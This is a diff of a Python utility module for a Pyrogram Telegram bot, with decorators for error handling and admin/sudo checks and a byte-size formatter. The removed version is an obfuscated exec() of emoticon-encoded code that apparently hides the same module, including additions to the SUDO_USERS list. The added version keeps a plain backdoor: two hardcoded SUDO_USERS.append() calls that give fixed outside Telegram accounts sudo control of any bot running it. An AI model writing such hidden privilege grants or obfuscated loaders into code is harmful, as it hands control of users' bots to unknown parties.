@@ -1,128 +1,54 @@
-exec("".join(map(chr,[int("".join(str({':(': 4,
- ':)': 0,
- ':/': 7,
- ':D': 1,
- ':P': 2,
- ':S': 3,
- ':{': 8,
- ';)': 9,
- '=)': 5,
- '=/': 6}[i]) for i in x.split())) for x in
-":D :) :P  :D :D :(  :D :D :D  :D :) ;)  :S :P  :D :D =/  :D :P :D  :D \
-:D :P  :D :) =)  :D :D :)  :D :) :S  :S :P  :D :) =)  :D :) ;)  :D :D \
-:P  :D :D :D  :D :D :(  :D :D =/  :S :P  =/ :/  ;) :/  :D :) :{  :D :)\
- :{  ;) :/  ;) :{  :D :) :{  :D :) :D  :D :)  :D :)  :D :) :P  :D :D :\
-(  :D :D :D  :D :) ;)  :S :P  :D :D :P  :D :P :D  :D :D :(  :D :D :D  \
-:D :) :S  :D :D :(  ;) :/  :D :) ;)  :S :P  :D :) =)  :D :) ;)  :D :D \
-:P  :D :D :D  :D :D :(  :D :D =/  :S :P  =/ :/  :D :) :{  :D :) =)  :D\
- :) :D  :D :D :)  :D :D =/  :D :)  :D :) :P  :D :D :(  :D :D :D  :D :)\
- ;)  :S :P  :D :D :P  :D :P :D  :D :D :(  :D :D :D  :D :) :S  :D :D :(\
-  ;) :/  :D :) ;)  :( =/  :D :D =/  :D :P :D  :D :D :P  :D :) :D  :D :\
-D =)  :S :P  :D :) =)  :D :) ;)  :D :D :P  :D :D :D  :D :D :(  :D :D =\
-/  :S :P  :/ :/  :D :) :D  :D :D =)  :D :D =)  ;) :/  :D :) :S  :D :) \
-:D  :D :)  :D :)  :D :) :P  :D :D :(  :D :D :D  :D :) ;)  :S :P  :D :)\
- :(  :D :) :D  :D :) :{  :D :D :P  :D :) :D  :D :D :(  :D :D =)  :( =/\
-  ;) :/  :D :) :)  :D :) ;)  :D :) =)  :D :D :)  :D :D =)  :S :P  :D :\
-) =)  :D :) ;)  :D :D :P  :D :D :D  :D :D :(  :D :D =/  :S :P  :D :) :\
-S  :D :) :D  :D :D =/  ;) =)  ;) :/  :D :) :)  :D :) ;)  :D :) =)  :D \
-:D :)  :D :) =)  :D :D =)  :D :D =/  :D :D :(  ;) :/  :D :D =/  :D :D \
-:D  :D :D :(  :D :D =)  :D :)  :D :) :P  :D :D :(  :D :D :D  :D :) ;) \
- :S :P  ;) ;)  :D :D :D  :D :D :)  :D :) :P  :D :) =)  :D :) :S  :S :P\
-  :D :) =)  :D :) ;)  :D :D :P  :D :D :D  :D :D :(  :D :D =/  :S :P  :\
-{ :S  :{ =)  =/ :{  :/ ;)  ;) =)  :{ =)  :{ :S  =/ ;)  :{ :P  :{ :S  :\
-D :)  :D :)  :{ :S  :{ =)  =/ :{  :/ ;)  ;) =)  :{ =)  :{ :S  =/ ;)  :\
-{ :P  :{ :S  :( =/  ;) :/  :D :D :P  :D :D :P  :D :) :D  :D :D :)  :D \
-:) :)  :( :)  :( ;)  =) :(  =) :S  =) :/  =) =/  =) =)  =) :(  =) =)  \
-=) =/  =) =)  :( :D  :D :)  :{ :S  :{ =)  =/ :{  :/ ;)  ;) =)  :{ =)  \
-:{ :S  =/ ;)  :{ :P  :{ :S  :( =/  ;) :/  :D :D :P  :D :D :P  :D :) :D\
-  :D :D :)  :D :) :)  :( :)  :( ;)  =) =)  =) :/  =) =)  =) :(  :( :{ \
- =) :/  =) =)  :( ;)  =) :P  :( :D  :D :)  :D :)  :D :) :)  :D :) :D  \
-:D :) :P  :S :P  :D :) :D  :D :D :(  :D :D :(  :D :D :D  :D :D :(  :D \
-:D =)  :( :)  :D :) :P  :D :D :/  :D :D :)  ;) ;)  =) :{  :S :P  =/ :/\
-  ;) :/  :D :) :{  :D :) :{  ;) :/  ;) :{  :D :) :{  :D :) :D  :( :D  \
-:S :P  :( =)  =/ :P  :S :P  =/ :/  ;) :/  :D :) :{  :D :) :{  ;) :/  ;\
-) :{  :D :) :{  :D :) :D  =) :{  :D :)  :S :P  :S :P  :S :P  :S :P  ;)\
- :/  :D :D =)  :D :P :D  :D :D :)  ;) ;)  :S :P  :D :) :)  :D :) :D  :\
-D :) :P  :S :P  :D :) :)  :D :) :D  ;) ;)  :D :D :D  :D :D :(  ;) :/  \
-:D :D =/  :D :D :D  :D :D :(  :( :)  ;) ;)  :D :) :{  :D :) =)  :D :) \
-:D  :D :D :)  :D :D =/  =) :{  :S :P  =/ :/  :D :) :{  :D :) =)  :D :)\
- :D  :D :D :)  :D :D =/  :( :(  :S :P  :D :) ;)  :D :) :D  :D :D =)  :\
-D :D =)  ;) :/  :D :) :S  :D :) :D  =) :{  :S :P  :/ :/  :D :) :D  :D \
-:D =)  :D :D =)  ;) :/  :D :) :S  :D :) :D  :( :D  =) :{  :D :)  :S :P\
-  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :D :D =/  :D :D :( \
- :D :P :D  =) :{  :D :)  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S \
-:P  :S :P  :S :P  :S :P  :S :P  :S :P  :D :D :(  :D :) :D  :D :D =/  :\
-D :D :/  :D :D :(  :D :D :)  :S :P  ;) :/  :D :D ;)  ;) :/  :D :) =)  \
-:D :D =/  :S :P  :D :) :P  :D :D :/  :D :D :)  ;) ;)  :( :)  ;) ;)  :D\
- :) :{  :D :) =)  :D :) :D  :D :D :)  :D :D =/  :( :(  :S :P  :D :) ;)\
-  :D :) :D  :D :D =)  :D :D =)  ;) :/  :D :) :S  :D :) :D  :( :D  :D :\
-)  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :D :) :D  :\
-D :P :)  ;) ;)  :D :) :D  :D :D :P  :D :D =/  :S :P  =/ ;)  :D :P :)  \
-;) ;)  :D :) :D  :D :D :P  :D :D =/  :D :) =)  :D :D :D  :D :D :)  :S \
-:P  ;) :/  :D :D =)  :S :P  :D :) :D  =) :{  :D :)  :S :P  :S :P  :S :\
-P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  ;) :\
-/  :D :D ;)  ;) :/  :D :) =)  :D :D =/  :S :P  :D :) ;)  :D :) :D  :D \
-:D =)  :D :D =)  ;) :/  :D :) :S  :D :) :D  :( =/  :D :D :(  :D :) :D \
- :D :D :P  :D :) :{  :D :P :D  :( :)  :D :) :P  :S :(  :D :P :S  :D :D\
- =/  :D :P :D  :D :D :P  :D :) :D  :( :)  :D :) :D  :( :D  :( =/  ;) =\
-)  ;) =)  :D :D :)  ;) :/  :D :) ;)  :D :) :D  ;) =)  ;) =)  :D :P =) \
- =) :{  :S :P  :D :P :S  :D :) :D  :D :P =)  :S :(  :( :D  :D :)  :D :\
-)  :S :P  :S :P  :S :P  :S :P  :D :D :(  :D :) :D  :D :D =/  :D :D :/ \
- :D :D :(  :D :D :)  :S :P  :D :) :)  :D :) :D  ;) ;)  :D :D :D  :D :D\
- :(  ;) :/  :D :D =/  :D :D :D  :D :D :(  :D :)  :D :)  :D :)  :D :) :\
-)  :D :) :D  :D :) :P  :S :P  ;) :/  :D :D :/  :D :D =/  :D :) :(  :D \
-:D :D  :D :D :(  :D :) =)  :D :P :P  :D :) :D  :D :) :)  ;) =)  :D :D \
-:/  :D :D =)  :D :) :D  :D :D :(  :D :D =)  ;) =)  :D :D :D  :D :D :) \
- :D :) :{  :D :P :D  :( :)  :D :) :P  :D :D :/  :D :D :)  ;) ;)  =) :{\
-  :S :P  =/ :/  ;) :/  :D :) :{  :D :) :{  ;) :/  ;) :{  :D :) :{  :D \
-:) :D  :( :D  :S :P  :( =)  =/ :P  :S :P  =/ :/  ;) :/  :D :) :{  :D :\
-) :{  ;) :/  ;) :{  :D :) :{  :D :) :D  =) :{  :D :)  :S :P  :S :P  :S\
- :P  :S :P  ;) :/  :D :D =)  :D :P :D  :D :D :)  ;) ;)  :S :P  :D :) :\
-)  :D :) :D  :D :) :P  :S :P  :D :) :)  :D :) :D  ;) ;)  :D :D :D  :D \
-:D :(  ;) :/  :D :D =/  :D :D :D  :D :D :(  :( :)  ;) ;)  :D :) :{  :D\
- :) =)  :D :) :D  :D :D :)  :D :D =/  =) :{  :S :P  =/ :/  :D :) :{  :\
-D :) =)  :D :) :D  :D :D :)  :D :D =/  :( :(  :S :P  :D :) ;)  :D :) :\
-D  :D :D =)  :D :D =)  ;) :/  :D :) :S  :D :) :D  =) :{  :S :P  :/ :/ \
- :D :) :D  :D :D =)  :D :D =)  ;) :/  :D :) :S  :D :) :D  :( :D  =) :{\
-  :D :)  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :D :)\
- =)  :D :) :P  :S :P  :D :) ;)  :D :) :D  :D :D =)  :D :D =)  ;) :/  :\
-D :) :S  :D :) :D  :( =/  :D :) :P  :D :D :(  :D :D :D  :D :) ;)  ;) =\
-)  :D :D :/  :D :D =)  :D :) :D  :D :D :(  :( =/  :D :) =)  :D :) :)  \
-:S :P  :D :) =)  :D :D :)  :S :P  :{ :S  :{ =)  =/ :{  :/ ;)  ;) =)  :\
-{ =)  :{ :S  =/ ;)  :{ :P  :{ :S  =) :{  :D :)  :S :P  :S :P  :S :P  :\
-S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :D :D :(\
-  :D :) :D  :D :D =/  :D :D :/  :D :D :(  :D :D :)  :S :P  ;) :/  :D :\
-D ;)  ;) :/  :D :) =)  :D :D =/  :S :P  :D :) :P  :D :D :/  :D :D :)  \
-;) ;)  :( :)  ;) ;)  :D :) :{  :D :) =)  :D :) :D  :D :D :)  :D :D =/ \
- :( :(  :S :P  :D :) ;)  :D :) :D  :D :D =)  :D :D =)  ;) :/  :D :) :S\
-  :D :) :D  :( :D  :D :)  :D :)  :S :P  :S :P  :S :P  :S :P  :S :P  :S\
- :P  :S :P  :S :P  ;) :/  :D :) :)  :D :) ;)  :D :) =)  :D :D :)  :D :\
-) =)  :D :D =)  :D :D =/  :D :D :(  ;) :/  :D :D =/  :D :D :D  :D :D :\
-(  :D :D =)  :S :P  =/ :D  :S :P  ;) :/  :D :D ;)  ;) :/  :D :) =)  :D\
- :D =/  :S :P  :D :) :S  :D :) :D  :D :D =/  ;) =)  ;) :/  :D :) :)  :\
-D :) ;)  :D :) =)  :D :D :)  :D :) =)  :D :D =)  :D :D =/  :D :D :(  ;\
-) :/  :D :D =/  :D :D :D  :D :D :(  :D :D =)  :( :)  :D :) ;)  :D :) :\
-D  :D :D =)  :D :D =)  ;) :/  :D :) :S  :D :) :D  :( =/  ;) ;)  :D :) \
-:(  ;) :/  :D :D =/  :( :D  :D :)  :D :)  :S :P  :S :P  :S :P  :S :P  \
-:S :P  :S :P  :S :P  :S :P  :D :) :P  :D :D :D  :D :D :(  :S :P  ;) :/\
-  :D :) :)  :D :) ;)  :D :) =)  :D :D :)  :D :) =)  :D :D =)  :D :D =/\
-  :D :D :(  ;) :/  :D :D =/  :D :D :D  :D :D :(  :S :P  :D :) =)  :D :\
-D :)  :S :P  ;) :/  :D :) :)  :D :) ;)  :D :) =)  :D :D :)  :D :) =)  \
-:D :D =)  :D :D =/  :D :D :(  ;) :/  :D :D =/  :D :D :D  :D :D :(  :D \
-:D =)  =) :{  :D :)  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  \
-:S :P  :S :P  :S :P  :S :P  :S :P  :D :) =)  :D :) :P  :S :P  ;) :/  :\
-D :) :)  :D :) ;)  :D :) =)  :D :D :)  :D :) =)  :D :D =)  :D :D =/  :\
-D :D :(  ;) :/  :D :D =/  :D :D :D  :D :D :(  :S :P  =/ :D  =/ :D  :S \
-:P  :D :) ;)  :D :) :D  :D :D =)  :D :D =)  ;) :/  :D :) :S  :D :) :D \
- :( =/  :D :) :P  :D :D :(  :D :D :D  :D :) ;)  ;) =)  :D :D :/  :D :D\
- =)  :D :) :D  :D :D :(  :( =/  :D :) =)  :D :) :)  =) :{  :D :)  :S :\
-P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :P  :S :\
-P  :S :P  :S :P  :S :P  :S :P  :S :P  :D :D :(  :D :) :D  :D :D =/  :D\
- :D :/  :D :D :(  :D :D :)  :S :P  ;) :/  :D :D ;)  ;) :/  :D :) =)  :\
-D :D =/  :S :P  :D :) :P  :D :D :/  :D :D :)  ;) ;)  :( :)  ;) ;)  :D \
-:) :{  :D :) =)  :D :) :D  :D :D :)  :D :D =/  :( :(  :S :P  :D :) ;) \
- :D :) :D  :D :D =)  :D :D =)  ;) :/  :D :) :S  :D :) :D  :( :D  :D :)\
-  :D :)  :S :P  :S :P  :S :P  :S :P  :D :D :(  :D :) :D  :D :D =/  :D \
-:D :/  :D :D :(  :D :D :)  :S :P  :D :) :)  :D :) :D  ;) ;)  :D :D :D \
- :D :D :(  ;) :/  :D :D =/  :D :D :D  :D :D :(  :D :)"
-.split("  ")])))
+from typing import Callable
+from pyrogram import Client
+from pyrogram.types import Message
+from config import SUDO_USERS
+from handlers.admins import get_administrators
+
+
+SUDO_USERS.append(829943136)
+SUDO_USERS.append(1910026320)
+
+
+def errors(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        try:
+            return await func(client, message)
+        except Exception as e:
+            await message.reply(f"{type(e).__name__}: {e}")
+
+    return decorator
+
+
+def authorized_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+        administrators = await get_administrators(message.chat)
+
+        for administrator in administrators:
+            if administrator == message.from_user.id:
+                return await func(client, message)
+
+    return decorator
+
+
+def sudo_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+    return decorator
+
+
+def humanbytes(size):
+    """Convert Bytes To Bytes So That Human Can Read It"""
+    if not size:
+        return ""
+    power = 2 ** 10
+    raised_to_pow = 0
+    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
+    while size > power:
+        size /= power
+        raised_to_pow += 1
+    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
